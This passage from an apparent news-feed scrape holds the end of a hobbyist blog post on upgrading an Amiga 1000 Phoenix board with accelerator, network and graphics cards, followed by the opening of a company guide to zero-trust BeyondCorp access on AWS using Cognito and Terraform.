<figure><img src="https://i2.wp.com/imgur.com/wzAdwin.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/wzAdwin.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/B2j2Lvt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/B2j2Lvt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>It worked like a charm so now I had two working power supplies – original and superior to it HDPLEX with a kickass adapter.</p>
<h4>030 cards</h4>
<p>The next step was about adding 68030 CPU to the system. I had two options as MrTrinsic sent me two different solutions.</p>
<p>The First solution was an <a rel="noreferrer noopener" href="https://icomp.de/shop-icomp/en/produkt-details/product/ACA500plus.html" target="_blank">ACA500plus</a> card along with <a rel="noreferrer noopener" href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank">an ACA1233n</a> accelerator card by Individual Computers. ACA500plus also had an Ethernet add-on – X-Surf 500</p>
<p>These two make a great solution but for AMIGA 500. There are not many folks out there who played it with it in an A1000 and especially with a Phoenix mobo!</p>
<figure><img src="https://i2.wp.com/imgur.com/bTlloDp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/bTlloDp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/sbzmxTx.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/sbzmxTx.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>The first run was promising …</p>
<figure><img src="https://i2.wp.com/imgur.com/LFm6kCo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/LFm6kCo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/FlttUWD.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/FlttUWD.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Then I’ve added ACA1233n on an EXTREMELY WANTED DURING PANDEMIC stand 😀 😀 😀</p>
<figure><img src="https://i0.wp.com/imgur.com/oU3w4xv.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/oU3w4xv.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/BMKsRiL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/BMKsRiL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/pMIcpbV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/pMIcpbV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>To my surprise, it worked!</p>
<figure><img src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/pWIyOlg.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/pWIyOlg.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/GbOnzwF.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/GbOnzwF.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Below, a demo running on this setup</p>
<figure><p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/PJYyBRBnhu8?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>
</p></figure>
<p>The second setup was a bit different. It is made of four devices.</p>
<ul><li>Open 68000 relocator card</li><li>68030 accelerator card </li><li>SDRam + IDE interface</li><li>IDE2CF interface</li></ul>
<p>This setup also appeared to be working nicely after some tests, however as MrTrinsic pointed out, it has some stability issues and will not allow running some software so it was a backup card in case ACA failed. I don’t have a video of it running though.</p>
<figure><img src="https://i0.wp.com/imgur.com/ll5k4FQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/ll5k4FQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/hNND0rK.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/hNND0rK.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/6dDVLSJ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/6dDVLSJ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/9m0vnry.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/9m0vnry.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Other mods and add-ons</h4>
<p>Once accel-cards were tested, I’ve started installing OS and testing other mods. To name the few:</p>
<ul><li>X-surf 500 Ethernet card</li><li>RapidRoad USB</li><li>Indivision ECS v2</li><li>SCSI2SD </li><li>KryoFlux GBAPII++</li></ul>
<figure><img src="https://i0.wp.com/imgur.com/EBLwZFR.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/EBLwZFR.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/i.imgur.com/x7HIGH1.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/x7HIGH1.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/khhqFtb.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/khhqFtb.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/n0qbkbP.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/n0qbkbP.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Indivision ECS v2 and SCSI2SD worked flawlessly so I started playing with other gear.</p>
<figure><img src="https://i1.wp.com/i.imgur.com/p2dSIad.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/p2dSIad.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>After installing all the needed software I’ve finally managed to get an IP addr from my local DHCP server</p>
<figure><img src="https://i1.wp.com/i.imgur.com/DS3Vz0m.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/DS3Vz0m.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/m0IKjsS.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/m0IKjsS.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/XGyz7F0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/XGyz7F0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/OMaE81e.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/OMaE81e.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Obviously, I wouldn’t be myself if I didn’t destroy something. I’ve accidentally connected the RapidRoad USB module to a clock port the other way around. The magic smoke appeared and…</p>
<figure><img src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I had to fix it. After a while, it turned out that only 3R3 resistor was fried.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/GdJIXWt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/GdJIXWt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>I’ve quickly replaced it and started testing USB functionality.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/OXAhtvf.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/OXAhtvf.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/5tzhgLD.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/5tzhgLD.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>GFX cards</h4>
<p>Once all other major mods were working more or less correctly, I could start testing GFX cards high-res modes.</p>
<p>This is where it all started to go wrong …</p>

<p>I had two cards to test with this setup – GBAPII++ by Kryoflux and ZZ9000 by MNT. </p>
<p>GBAPII++ worked nicely only with green 030 cards, but in such config, there would be no Ethernet card.</p>
<figure><img src="https://i0.wp.com/i.imgur.com/GMNmuZ5.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/GMNmuZ5.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/RaE0AYH.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/RaE0AYH.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/x5aY8Sy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/x5aY8Sy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/rxF5KEt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/rxF5KEt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Then I’ve tried running ZZ9000 along with green 030 and ACA cards but I’ve encountered autoconfig problems.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/JWDIXJ4.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/JWDIXJ4.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/i.imgur.com/G5sFp80.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/G5sFp80.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/j5tkOVP.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/j5tkOVP.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Finally, I’ve focused on ACA500plus with ACA1233n and I just couldn’t make it work. </p>
<p>When ACA was inserted then GBAPII++ was completely invisible to the system.</p>
<p>After updating tons of libraries, firmware and reinstalling OS a few times without any luck, we’ve figured out that it might be a power issue. MrTrinsic ordered an adapter for A500 which would allow pumping in more power.</p>
<p>I’ve first tested it with a stock A500.</p>
<figure><img src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/P3Luh0r.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/P3Luh0r.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Same story, GBAPII++ was invisible but I’ve checked it with A1K and power injector adapter just to be sure … unfortunately no luck again.</p>
<figure><img src="https://i0.wp.com/imgur.com/1hkTi44.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1hkTi44.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Unfinished 🙁</h4>
<p>I’ve invested weeks of time into this GFX problem research but finally, I had to give up on this project for now. It is still in an unfinished state until we will find a solution to all problems. The project is partially done but it requires more work and I hope to cover it someday in one of the future posts making Amiga 1000 Phoenix great again!</p>
<p>But worry not, this gave birth to a new project which is even more awesome.</p>
<p>Currently, it is a work-in-progress but that is a story for another blog post 🙂</p>
<figure><img src="https://i0.wp.com/imgur.com/puO0E7q.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/puO0E7q.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>OUTRO</h4>
<p>If any of my readers know any solution, hints, or knows where I did mistakes, then please leave a comment here or on FB and Twitter pages.</p>
<p>If you want to get retro gear or hardware modules, please visit <a href="https://retrohax.net/shop/">our shop</a> -&gt; https://retrohax.net/shop/</p>
<p>Please support our work by commenting here and on our <a href="https://www.facebook.com/Retrohax.net">Facebook</a> and <a href="https://twitter.com/RetrohaxN">Twitter</a> pages.</p>
<p>If you want to donate a dead computer then <a href="https://retrohax.net/contact/">drop me an email</a>. Extreme cases are welcome 🙂</p>

 </div>

</article></div>]]>
            </description>
            <link>https://retrohax.net/amiga-1000-project-phoenix-motherborad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24905247</guid>
            <pubDate>Tue, 27 Oct 2020 07:52:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Restrict Access to your internal websites on AWS with BeyondCorp]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 54 (<a href="https://news.ycombinator.com/item?id=24901699">thread link</a>) | @giacaglia
<br/>
October 26, 2020 | https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp | <a href="https://web.archive.org/web/*/https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Internal websites. Every company has them, and they often contain some of your company’s most important data. So you should protect them to protect that data.</p><p>This isn’t a new idea, as companies have been creating VPNs (virtual private networks) to restrict access to their internal networks for decades. But once Google became wary of this approach in 2009 after the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Operation_Aurora">Operation Aurora</a> hack attempt, they decided to shift towards a zero-trust security model, where every request is treated as though it is coming from a network that could be compromised.</p><p>This gave birth to <a target="_blank" rel="noopener noreferrer" href="https://www.beyondcorp.com/">BeyondCorp</a>, a theoretical model for protecting all of your applications without the use of a VPN.</p><p>This idea has been widely praised by security researchers, though practical guides on getting started with it on the most popular cloud platforms are still limited. This is despite the fact that <a target="_blank" rel="noopener noreferrer" href="https://research.google/pubs/pub43231/">Google’s whitepaper explaining the idea</a> was released in 2014.</p><p>We get it, BeyondCorp is complex. It asks you to look at every single request flowing through your system and to validate it’s legitimacy based on multiple data sources: where is the request coming from, who is sending it, what is the security status of that source, etc. That’s a lot to ask!</p><p>But we also believe that getting started with BeyondCorp is much easier than many may think, and that the security payoffs can come immediately.</p><p>This blog post aims to provide a practical implementation guide for using BeyondCorp security on your internal websites hosted in AWS.</p><p>At Transcend, we use BeyondCorp security to ensure our IP and our users’ data stays safe.</p><h2 id="enough-buzz-words-what-would-this-look-like-as-a-user">Enough buzz words. What would this look like as a user?</h2><p>BeyondCorp is filled with buzz words. It’s zero trust. It’s perimeter-less. It’s context-aware.
That sure is a lot of cool phrases. But what does it look like in real life? Well, let’s see what happens when I go to Transcend’s internal codelabs site, where we have set up BeyondCorp authentication with our company’s GSuite credentials:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/4t5suIga3myM4BR0tamdNg/7c40bb6aba6f5a3e231308b12f3ca960/demo.gif" alt="A GIF of a successful implementation of BeyondCorp with AWS."></p></div><p>When I attempt to load the site, it asks me to login with my GSuite credentials. Note that this includes a hardware MFA token requirement that is easily enforceable across an entire GSuite organization (and many other identity providers).
Once I gain access to the site, I won’t need to log in to any internal systems for an hour.</p><p>To see for yourself, head on over to <a target="_blank" rel="noopener noreferrer" href="https://codelabs.dev.trancsend.com/">codelabs.dev.trancsend.com</a>. While the DNS is public, only our internal employees can gain access to our internal tutorials, and you won’t be allowed in unless you have an <code>@transcend.io</code> email address.</p><p><em>Side note: You can check out some of our publicly facing tutorials at <a target="_blank" rel="noopener noreferrer" href="https://codelabs.transcend.io/">codelabs.transcend.io</a></em></p><h2 id="how-is-this-better-than-a-vpn">How is this better than a VPN?</h2><p><strong>VPNs create “eggshell” security, where all protections happen at the perimeter</strong>. Once access is gained into a system, all the data inside that network is accessible. And with the rise of remote work, cell phones, and other mobile devices, your “secure” network of trusted devices is becoming wider all the time. </p><p>In contrast, BeyondCorp encourages consistent authentication throughout all parts of an application for all devices. It doesn’t matter what device attempts to access codelabs.dev.trancsend.com, even our CEO’s laptop will need to authenticate securely before viewing the site’s contents.</p><p><strong>VPNs are an extra attack vector</strong>.  When a pentester or hacker attempts to attack your network, one very common approach is to search for vulnerabilities in any public-facing server of yours they can find.
Oftentimes, systems like VPN access points are a primary target.
<a target="_blank" rel="noopener noreferrer" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">Here’s a story</a> where a bug bounty hunter attacked Facebook using this approach. When he gained access to one of their internal servers, he noticed leftover files from another pentester who had used the same vulnerability to steal a small number of internal credentials.</p><p>Exploits related to CVEs (common vulnerabilities and exposures) on VPN servers are all too common, such as the time that <a target="_blank" rel="noopener noreferrer" href="https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/">900+ enterprise VPN servers had their passwords dumped</a>, or when a <a target="_blank" rel="noopener noreferrer" href="https://www.claroty.com/2020/07/28/vpn-security-flaws/">commonly used VPN implementation allowed for direct access to I/O devices</a>. Or the time that Lockheed Martin who (despite a solid effort to include MFA on their VPN) was <a target="_blank" rel="noopener noreferrer" href="https://www.darkreading.com/risk-management/lockheed-martin-suffers-massive-cyberattack/d/d-id/1098013">still attacked by a group who had found the random seeds used to generate tokens on their hardware MFA tokens</a>.</p><p>And if you use your company’s WiFi network as a trusted network, that network can become an attack vector as well. In 2016, the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/KRACK">KRACK vulnerability in WPA2</a> allowed attackers to find the encryption keys for all network traffic flowing through a router.</p><p>These hacks are not theoretical. They are directed and well-coordinated. When your company is successful, someone will want your data.</p><p>In contrast, BeyondCorp has no VPN. Instead of having a public-facing service that gives access to internal, hidden sites, BeyondCorp has public-facing services that request authentication information from an internal, hidden authentication server.
Because this authentication server is not exposed, it is much harder to attack.</p><p><strong>VPNs offer no guarantees over security within your network</strong></p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7ciKFAqbRCpa2U9B0quoJJ/4957bb9dc1660cf4fc434d27e7cda6d2/NSA_Slide_Smiley.png" alt="A diagram obtained by the Washington Post that shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure."></p><figcaption>Image via Washington Post.</figcaption></div><p>While your internal service #9001 may have a firewall rule saying that only server #4001 can talk to it on port 443, how does service #9001 know that the request on #4001 was not sent by an adversary who got through the VPN security? </p><p>It doesn’t in traditional architectures.</p><p>In Edward Snowden’s document dump to the Washington Post in 2013, we got to see the picture above. In it, the NSA shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure.</p><p>In this case, the NSA didn’t even need to break into the perimeter. Their <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/MUSCULAR_(surveillance_program)">MUSCULAR program</a> went directly to the network infrastructure that connected Google’s (and Yahoo’s) data centers, siphoning off so much data from the fiber optic cables that the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Pinwale">NSA’s PINWALE database was overwhelmed</a>.</p><p>This attack was painfully simple. In today’s world of cloud everything, it’s important to remember that the VPN that protects your network physically exists somewhere, and that the cables that your network traffic flows through exist physically somewhere. Attackers are smart, and will make use of all vectors at their disposal.</p><p>In contrast, BeyondCorp authenticates all requests, even those inside your private networks. Services like AWS App Mesh will <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/app-mesh/latest/userguide/proxy-authorization.html">soon require that Proxy Authorization is used for all internal requests</a>. This requirement, as well as the increased ease of using TLS everywhere on service meshes, makes it far easier to enforce encryption and security for your network traffic.</p><h2 id="where-do-we-start">Where do we start?</h2><p>AWS has a few services that make implementing BeyondCorp quite manageable. If you’re getting nervous and thinking that adding application code to every single frontend and backend in your company sounds like a lot of work, have no fear—Amazon Cognito is here!</p><p><a target="_blank" rel="noopener noreferrer" href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a managed service for authentication management. It connects with many identity providers, like Google, Facebook, and Apple, while also supporting generic providers through SAML and OpenID Connect.</p><p>If you aren’t familiar with these authentication protocols, just know that it means that in the Codelabs demo from earlier, you can change the GSuite login to be login through Okta, Amazon accounts, your company’s custom auth, etc.</p><p>Cognito is a great fit for introducing BeyondCorp because it lives at the infrastructure level, and can be easily added to individual services. This makes adding BeyondCorp incrementally easy, and also means that you don’t need to make <strong>any</strong> application code changes. If you have polyglot apps written in a variety of languages and frameworks, you’re in luck: Cognito works the same way for all of them.</p><h2 id="creating-a-cognito-user-group">Creating a Cognito User Group</h2><p>The first step of this process is to create a group of people who can access your resources. With Cognito, each different group of people that should have access to a different set of resources can be made into a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-user-groups.html">User Pool</a>.</p><p>To create a User Pool with <a target="_blank" rel="noopener noreferrer" href="https://www.terraform.io/">Terraform</a>, we can write:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool"</span><span> </span><span>"pool"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>name</span><span> </span><span>=</span><span> </span><span>"codelab-user-pool"</span><span></span></p><p><span>3</span><span></span><span>}</span></p></pre></div><p>The next step is to create a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a>, which is what controls the settings for how users can authenticate to the User Pool:</p><div><pre><p><span>1</span><span>locals</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>         </span><span>=</span><span> </span><span>"codelabs.dev.trancsend.com"</span><span></span></p><p><span>3</span><span>  </span><span>backend_alias</span><span>  </span><span>=</span><span> </span><span>"beyondcorp-alb.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>4</span><span>  </span><span>frontend_alias</span><span> </span><span>=</span><span> </span><span>"beyondcorp-cloudfront.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>resource </span><span>"aws_cognito_user_pool_client"</span><span> </span><span>"client"</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>  </span><span>name</span><span>                </span><span>=</span><span> </span><span>"codelab-user-pool-client"</span><span></span></p><p><span>9</span><span>  </span><span>user_pool_id</span><span>        </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>10</span><span>  </span><span>generate_secret</span><span>     </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>11</span><span>  